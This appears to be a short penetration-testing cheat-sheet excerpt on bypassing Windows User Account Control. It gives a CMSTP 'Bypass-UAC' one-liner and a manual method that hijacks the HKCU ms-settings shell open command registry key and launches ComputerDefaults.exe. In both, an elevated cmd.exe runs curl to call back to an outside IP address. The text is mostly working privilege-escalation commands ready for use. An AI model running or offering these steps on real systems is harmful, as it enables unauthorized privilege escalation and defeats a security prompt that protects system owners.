### CMSTP

- Invoke and run: `Bypass-UAC -Command "curl http://192.168.45.223/worked"`

### Manual Approach

    New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
    New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe /c curl http://192.168.50.149/worked" -Force
    Start-Process "C:\Windows\System32\ComputerDefaults.exe"
